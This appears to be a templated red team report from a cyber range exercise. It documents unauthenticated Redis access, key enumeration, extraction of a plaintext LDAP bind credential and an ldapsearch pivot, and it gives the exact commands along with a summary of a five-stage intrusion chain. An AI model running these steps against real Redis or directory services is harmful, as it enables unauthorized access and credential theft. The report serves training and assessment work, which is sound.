# Red Team Engagement Report
**Classification:** RESTRICTED — White Team / Exercise Controller Only
**Report ID:** RED-REPORT-IT01-M05
**Version:** 1.0
**Date:** [Date of Exercise]
**Operator:** [Red Team Operator Name / Handle]
**Range:** RNG-IT-01 · Corporate Gateway
**Machine:** M5 — itgw-cache

---

## 1. Engagement Summary

| Field | Detail |
|---|---|
| Target | PUL Application Cache (Redis) |
| Target IP | `203.x.x.x` |
| Target Port | `6379` (TCP) |
| Attack Class | Unauthenticated Redis Access + Cache Key Data Harvest |
| Objective | Enumerate cache keys; extract LDAP pivot credential for RNG-IT-02 |
| Outcome | **SUCCESSFUL** — `cn=svc-deploy:D3pl0y@PUL2024` extracted; LDAP pivot to `203.x.x.x:389` confirmed |
| Pivot From | M4 SNMP OIDs (Redis host disclosed) |
| Time to Compromise | `[HH:MM]` from M4 completion |

---

## 2. Vulnerability Analysis

**Vulnerability 1:** Redis `bind 0.0.0.0` — service reachable from v-Public segment.
**Vulnerability 2:** No `requirepass` — zero authentication required.
**Vulnerability 3:** LDAP bind credential stored as a plaintext JSON value in a cache key.

**CVSS v3.1 Base Score:** `9.8 CRITICAL` (Network/None/None/Changed/High/High/High)

---

## 3. Attack Narrative & Timeline

| Step | Time | Action | Outcome |
|---|---|---|---|
| 1 | T+00:00 | `redis-cli -h 203.x.x.x PING` | `PONG` — unauthenticated access confirmed |
| 2 | T+00:01 | `KEYS *` | 5 keys discovered under `pul:*` namespace |
| 3 | T+00:02 | `GET pul:config:ldap` | JSON with LDAP host + bind credential |
| 4 | T+00:03 | `GET pul:session:admin` | Admin session JSON confirming credential |
| 5 | T+00:04 | `ldapsearch` bind to 203.x.x.x:389 | Successful — pivot to RNG-IT-02 confirmed |

---

## 4. Commands Executed

```bash
# Confirm unauthenticated access
redis-cli -h 203.x.x.x -p 6379 PING
redis-cli -h 203.x.x.x -p 6379 INFO server | grep -E "redis_version|os|tcp_port"

# Enumerate all keys
redis-cli -h 203.x.x.x -p 6379 KEYS "*"

# Read high-value keys
redis-cli -h 203.x.x.x -p 6379 GET "pul:config:ldap"
redis-cli -h 203.x.x.x -p 6379 GET "pul:session:admin"
redis-cli -h 203.x.x.x -p 6379 GET "pul:config:app"
redis-cli -h 203.x.x.x -p 6379 LRANGE "pul:queue:deploy" 0 -1

# Confirm pivot credential against RNG-IT-02 LDAP
ldapsearch -x -H ldap://203.x.x.x:389 \
  -D "cn=svc-deploy,ou=service,dc=prabalurja,dc=in" \
  -w "D3pl0y@PUL2024" \
  -b "dc=prabalurja,dc=in" "(objectClass=*)" dn 2>&1 | head -20
```

---

## 5. MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Unsecured Credentials | T1552 |
| Collection | Data from Local System | T1005 |
| Lateral Movement | Remote Services | T1021 |
| Discovery | Network Service Discovery | T1046 |

---

## 6. Final Pivot Artifact — RNG-IT-01 → RNG-IT-02

| Artifact | Value |
|---|---|
| LDAP Host | `203.x.x.x` |
| LDAP Port | `389` |
| Bind DN | `cn=svc-deploy,ou=service,dc=prabalurja,dc=in` |
| Password | `D3pl0y@PUL2024` |
| Base DN | `dc=prabalurja,dc=in` |
| Next Range | RNG-IT-02 — Internal Operations (`203.x.x.x/24`) |

---

## 7. Full RNG-IT-01 Intrusion Chain Summary

| Stage | Machine | Vulnerability | Artifact Obtained |
|---|---|---|---|
| M1 | itgw-webportal | Host Header Injection | Admin session → mail relay host |
| M2 | itgw-mailrelay | SMTP open relay + spool | `svc-deploy-sso:SSO@Prabal!2024` |
| M3 | itgw-sso | JWT alg:none confusion | SNMP host `203.x.x.x:161` |
| M4 | itgw-netmgmt | SNMP default community | Redis host `203.x.x.x:6379` + credential fragments |
| M5 | itgw-cache | Redis no-auth | LDAP `svc-deploy:D3pl0y@PUL2024` → RNG-IT-02 |

---

## 8. Evidence

> **[Attach: redis-cli PING — PONG with no auth]**
> **[Attach: KEYS * output]**
> **[Attach: GET pul:config:ldap — bind_pass visible]**
> **[Attach: ldapsearch confirm — successful bind to 203.x.x.x]**

---

**Report Prepared By:** [Red Team Operator]
**White Team Review:** [Exercise Controller]
**Classification:** RESTRICTED
